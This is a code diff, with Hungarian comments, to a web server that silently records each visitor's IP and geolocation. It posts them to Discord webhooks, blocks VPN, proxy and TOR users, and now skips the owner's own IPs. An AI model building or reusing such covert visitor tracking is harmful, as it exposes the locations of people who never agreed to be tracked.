@@ -14,6 +14,9 @@ const PROXYCHECK_API_KEY = process.env.PROXYCHECK_API_KEY;
 // --- VPN/proxy kivételek (whitelist) ---
 const WHITELISTED_IPS = process.env.ALLOWED_VPN_IPS ? process.env.ALLOWED_VPN_IPS.split(',').map(ip => ip.trim()) : [];
 
+// --- Saját IP-k, amiknél NEM küldünk Discord webhookot ---
+const MY_IPS = process.env.MY_IP ? process.env.MY_IP.split(',').map(ip => ip.trim()) : [];
+
 // --- TELJES LOG (fő log, minden infóval) ---
 function formatGeoDataTeljes(geo) {
   return (
@@ -169,38 +172,53 @@ app.get('/', async (req, res) => {
   const ip = getClientIp(req);
 
   // --- DEBUG LOG ---
-  console.log("Bejövő IP:", ip);
+  if (!MY_IPS.includes(ip)) {
+    console.log("Bejövő IP:", ip);
+  } else {
+    console.log("Saját IP-ről érkezett, részletes log/Discord kihagyva.");
+  }
   const vpnCheck = await isVpnProxy(ip);
-  console.log("VPN/proxy ellenőrzés eredménye:", vpnCheck ? "VPN/Proxy" : "Nem VPN/Proxy");
-  console.log("Whitelistben van?:", WHITELISTED_IPS.includes(ip) ? "Igen" : "Nem");
-  console.log("Whitelist tartalma:", WHITELISTED_IPS);
+  if (!MY_IPS.includes(ip)) {
+    console.log("VPN/proxy ellenőrzés eredménye:", vpnCheck ? "VPN/Proxy" : "Nem VPN/Proxy");
+    console.log("Whitelistben van?:", WHITELISTED_IPS.includes(ip) ? "Igen" : "Nem");
+    console.log("Whitelist tartalma:", WHITELISTED_IPS);
+  }
 
   const geoData = await getGeo(ip);
 
-  // --- FŐ WEBHOOK LOG (teljes) ---
-  axios.post(MAIN_WEBHOOK, {
-    username: "Helyszíni Naplózó <3",
-    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
-    content: '',
-    embeds: [{
-      title: 'Új látogató az oldalon!',
-      description: `**Oldal:** /${folderName}\n` + formatGeoDataTeljes(geoData),
-      color: 0x800080
-    }]
-  }).catch(()=>{});
-
-  // --- VPN/Proxy szűrés, de kivételezve a whitelistben szereplő IP-ket ---
-  if (!WHITELISTED_IPS.includes(ip) && vpnCheck) {
-    axios.post(ALERT_WEBHOOK, {
-      username: "VPN figyelő <3",
+  // --- FŐ WEBHOOK LOG (teljes) --- CSAK ha nem a saját IP
+  if (!MY_IPS.includes(ip)) {
+    axios.post(MAIN_WEBHOOK, {
+      username: "Helyszíni Naplózó <3",
       avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
       content: '',
       embeds: [{
-        title: 'VPN/proxy vagy TOR-ral próbálkozás!',
-        description: `**Oldal:** /${folderName}\n` + formatGeoDataVpn(geoData),
-        color: 0xff0000
+        title: 'Új látogató az oldalon!',
+        description: `**Oldal:** /${folderName}\n` + formatGeoDataTeljes(geoData),
+        color: 0x800080
       }]
     }).catch(()=>{});
+  } else {
+    console.log("Saját IP – fő webhook kihagyva.");
+  }
+
+  // --- VPN/Proxy szűrés, de kivételezve a whitelistben szereplő IP-ket ---
+  if (!WHITELISTED_IPS.includes(ip) && vpnCheck) {
+    // ALERT webhook CSAK ha nem a saját IP
+    if (!MY_IPS.includes(ip)) {
+      axios.post(ALERT_WEBHOOK, {
+        username: "VPN figyelő <3",
+        avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+        content: '',
+        embeds: [{
+          title: 'VPN/proxy vagy TOR-ral próbálkozás!',
+          description: `**Oldal:** /${folderName}\n` + formatGeoDataVpn(geoData),
+          color: 0xff0000
+        }]
+      }).catch(()=>{});
+    } else {
+      console.log("Saját IP – alert webhook kihagyva.");
+    }
     return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
   }
 
